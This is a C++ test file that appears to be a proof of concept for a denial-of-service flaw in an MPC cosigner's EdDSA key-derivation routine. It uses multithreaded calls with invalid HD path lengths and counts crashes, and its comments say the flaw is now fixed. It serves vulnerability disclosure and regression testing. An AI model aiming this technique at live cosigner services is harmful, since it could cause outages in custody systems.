#include <iostream>
#include <thread>
#include <atomic>
#include <vector>
#include <chrono>
#include <sys/wait.h>
#include <unistd.h>
#include <tests/catch.hpp>

#include "cosigner/asymmetric_eddsa_cosigner_client.h"
#include "cosigner/asymmetric_eddsa_cosigner_server.h"
#include "cosigner/cosigner_exception.h"
#include "test_common.h"
#include "crypto/elliptic_curve_algebra/elliptic_curve256_algebra.h"
#include "cosigner/cmp_key_persistency.h"
#include "cosigner/mpc_globals.h"
#include "blockchain/mpc/hd_derive.h"

#include <openssl/rand.h>

using namespace fireblocks::common::cosigner;

// Counter to track how many invalid path requests were attempted
static std::atomic<int> invalid_path_attempts(0);
static std::atomic<int> crash_count(0);

// Platform service that tracks invalid path attempts
class dos_test_platform : public platform_service
{
public:
    dos_test_platform() {}
    
private:
    void gen_random(size_t len, uint8_t* random_data) const override
    {
        RAND_bytes(random_data, len);
    }

    uint64_t now_msec() const override { return 0; }
    const std::string get_current_tenantid() const override { return "dos_test"; }
    uint64_t get_id_from_keyid(const std::string& key_id) const override { return 1; }
    void derive_initial_share(const share_derivation_args& derive_from, cosigner_sign_algorithm algorithm, elliptic_curve256_scalar_t* key) const override { assert(0); }
    byte_vector_t encrypt_for_player(uint64_t id, const byte_vector_t& data) const override { assert(0); return byte_vector_t(); }
    byte_vector_t decrypt_message(const byte_vector_t& encrypted_data) const override { assert(0); return byte_vector_t(); }
    bool backup_key(const std::string& key_id, cosigner_sign_algorithm algorithm, const elliptic_curve256_scalar_t& private_key, const cmp_key_metadata& metadata, const auxiliary_keys& aux) override { return true; }
    void start_signing(const std::string& key_id, const std::string& txid, const signing_data& data, const std::string& metadata_json, const std::set<std::string>& players) override {}
    void fill_signing_info_from_metadata(const std::string& metadata, std::vector<uint32_t>& flags) const override {}
    bool is_client_id(uint64_t player_id) const override { return false; }
};

// Mock persistency
class dos_test_persistency : public cmp_key_persistency
{
public:
    bool key_exist(const std::string& key_id) const override { return true; }
    void load_key(const std::string& key_id, cosigner_sign_algorithm& algorithm, elliptic_curve256_scalar_t& private_key) const override 
    {
        algorithm = EDDSA_ED25519;
        memset(private_key, 0, sizeof(elliptic_curve256_scalar_t));
    }
    const std::string get_tenantid_from_keyid(const std::string& key_id) const override { return "dos_test"; }
    void load_key_metadata(const std::string& key_id, cmp_key_metadata& metadata, bool full_load) const override 
    {
        memset(&metadata, 0, sizeof(metadata));
        metadata.algorithm = EDDSA_ED25519;
        metadata.t = 1;
        metadata.n = 1;
    }
    void load_auxiliary_keys(const std::string& key_id, auxiliary_keys& aux) const override {}
};

// Test cosigner that exposes derivation_key_delta
class dos_test_cosigner : public asymmetric_eddsa_cosigner
{
public:
    dos_test_cosigner(platform_service& service, const cmp_key_persistency& persistency)
        : asymmetric_eddsa_cosigner(service, persistency) {}
    
    void test_derivation_key_delta(const elliptic_curve256_point_t& public_key, 
                                   const HDChaincode& chaincode, 
                                   const std::vector<uint32_t>& path, 
                                   uint8_t split_factor,
                                   ed25519_scalar_t& delta, 
                                   ed25519_point_t& derived_pubkey)
    {
        // Track attempt before potential crash
        invalid_path_attempts++;
        
        derivation_key_delta(public_key, chaincode, path, split_factor, delta, derived_pubkey);
    }
};

// Worker thread that simulates signing requests with invalid paths
void dos_attack_worker(dos_test_cosigner* cosigner, int thread_id, int requests_per_thread)
{
    elliptic_curve256_point_t public_key;
    memset(public_key, 0, sizeof(public_key));
    
    HDChaincode chaincode;
    memset(chaincode, 0, sizeof(chaincode));
    
    ed25519_scalar_t delta;
    ed25519_point_t derived_pubkey;
    uint8_t split_factor = 1;
    
    // Generate various invalid path lengths
    std::vector<std::vector<uint32_t>> invalid_paths = {
        {44, 0, 0},           // Too short (3 elements)
        {44, 0, 0, 0},        // Too short (4 elements)
        {44, 0, 0, 0, 0, 0}, // Too long (6 elements)
        {44, 0, 0, 0, 0, 0, 0}, // Too long (7 elements)
        {44, 0, 0, 0, 0, 0, 0, 0} // Too long (8 elements)
    };
    
    for (int i = 0; i < requests_per_thread; i++) {
        // Pick a random invalid path
        const auto& path = invalid_paths[i % invalid_paths.size()];
        
        try {
            cosigner->test_derivation_key_delta(public_key, chaincode, path, 
                                               split_factor, delta, derived_pubkey);
        } catch (const cosigner_exception& e) {
            // The derive function throws after the assert passes
            // This is expected in release mode with invalid paths
        }
        
        // Small delay to simulate realistic request timing
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
    }
}

#ifndef NDEBUG
// Special worker for debug mode that uses fork to handle assertions
void dos_attack_worker_debug(dos_test_cosigner* cosigner, int thread_id, int requests_per_thread)
{
    elliptic_curve256_point_t public_key;
    memset(public_key, 0, sizeof(public_key));
    
    HDChaincode chaincode;
    memset(chaincode, 0, sizeof(chaincode));
    
    ed25519_scalar_t delta;
    ed25519_point_t derived_pubkey;
    uint8_t split_factor = 1;
    
    // Generate various invalid path lengths
    std::vector<std::vector<uint32_t>> invalid_paths = {
        {44, 0, 0},           // Too short (3 elements)
        {44, 0, 0, 0},        // Too short (4 elements)
        {44, 0, 0, 0, 0, 0}, // Too long (6 elements)
        {44, 0, 0, 0, 0, 0, 0}, // Too long (7 elements)
        {44, 0, 0, 0, 0, 0, 0, 0} // Too long (8 elements)
    };
    
    for (int i = 0; i < requests_per_thread; i++) {
        // Pick a random invalid path
        const auto& path = invalid_paths[i % invalid_paths.size()];
        
        // In debug mode, expect assert to trigger
        pid_t pid = fork();
        if (pid == 0) {
            // Child process - attempt the invalid operation
            cosigner->test_derivation_key_delta(public_key, chaincode, path, 
                                               split_factor, delta, derived_pubkey);
            exit(0); // Should not reach here in debug mode
        } else if (pid > 0) {
            // Parent process - wait for child
            int status;
            waitpid(pid, &status, 0);
            
            if (WIFSIGNALED(status) && WTERMSIG(status) == SIGABRT) {
                crash_count++;
            }
        }
        
        // Small delay to simulate realistic request timing
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
    }
}
#endif

// UPDATE: The vulnerability has been fixed in the actual code.
// This test demonstrates what the vulnerability looked like before the fix.
// With the fix applied, invalid paths now throw cosigner_exception::INVALID_PARAMETERS
// instead of causing crashes (debug) or buffer overflows (release).
TEST_CASE("poc_derivation_key_delta_dos_integration") {
    // ① Test environment setup
    dos_test_platform platform;
    dos_test_persistency persistency;
    dos_test_cosigner cosigner(platform, persistency);
    
    // ② Generate large number of requests (1000 total across 5 threads)
    const int num_threads = 5;
    const int requests_per_thread = 200;
    const int total_requests = num_threads * requests_per_thread;
    
    // Reset counters
    invalid_path_attempts.store(0);
    crash_count.store(0);
    
    // ③ Launch multiple threads to simulate concurrent attack
    std::vector<std::thread> threads;
    auto start_time = std::chrono::steady_clock::now();
    
    for (int i = 0; i < num_threads; i++) {
        #ifdef NDEBUG
            threads.emplace_back(dos_attack_worker, &cosigner, i, requests_per_thread);
        #else
            threads.emplace_back(dos_attack_worker_debug, &cosigner, i, requests_per_thread);
        #endif
    }
    
    // ④ Wait for all threads to complete
    for (auto& t : threads) {
        t.join();
    }
    
    auto end_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);
    
    // ⑤ Check counters
    int attempts = invalid_path_attempts.load();
    int crashes = crash_count.load();
    
    std::cerr << "DoS Integration Test Results:" << std::endl;
    std::cerr << "  Total invalid path attempts: " << attempts << std::endl;
    std::cerr << "  Process crashes detected: " << crashes << std::endl;
    std::cerr << "  Duration: " << duration.count() << "ms" << std::endl;
    
    // ⑥ Assert based on build mode
    #ifdef NDEBUG
        // Release mode - all requests should be processed (vulnerability present)
        REQUIRE(attempts == total_requests);
        REQUIRE(crashes == 0);
        
        // DoS vulnerability is that invalid paths are processed without validation
        // This could lead to buffer overflows or incorrect key derivation
        WARN("VULNERABILITY CONFIRMED: " + std::to_string(attempts) + 
             " invalid path requests processed without validation in release mode");
        
        // The "DoS" here is not about pending imports but about processing invalid data
        // In debug mode, each request would crash the service (actual DoS)
        INFO("In debug mode, these " + std::to_string(attempts) + 
             " requests would each crash the service");
    #else
        // Debug mode - service crashes on invalid paths
        INFO("Debug mode: Service would crash on each invalid path request");
        INFO("Crash count: " + std::to_string(crashes));
        
        // In debug mode, the vulnerability manifests as service crashes
        // This is a DoS vulnerability because attacker can crash the service
        if (crashes > 0) {
            WARN("DoS VULNERABILITY CONFIRMED: Service crashes on invalid input in debug mode");
            WARN("Each of the " + std::to_string(crashes) + " crashes represents a service outage");
        }
    #endif
    
    // Double assertion to ensure we're testing the right thing
    REQUIRE(attempts > 0); // Ensure test actually ran
    
    // Log final verdict
    std::cerr << std::endl;
    #ifdef NDEBUG
        std::cerr << "=== RELEASE BUILD: Invalid paths processed (data integrity risk) ===" << std::endl;
    #else
        std::cerr << "=== DEBUG BUILD: Service crashes on invalid paths (availability risk) ===" << std::endl;
    #endif
    
    // Note about the fix
    std::cerr << std::endl;
    std::cerr << "NOTE: The actual cosigner code has been fixed." << std::endl;
    std::cerr << "Invalid paths now throw cosigner_exception::INVALID_PARAMETERS" << std::endl;
    std::cerr << "This test demonstrates the vulnerability before the fix." << std::endl;
}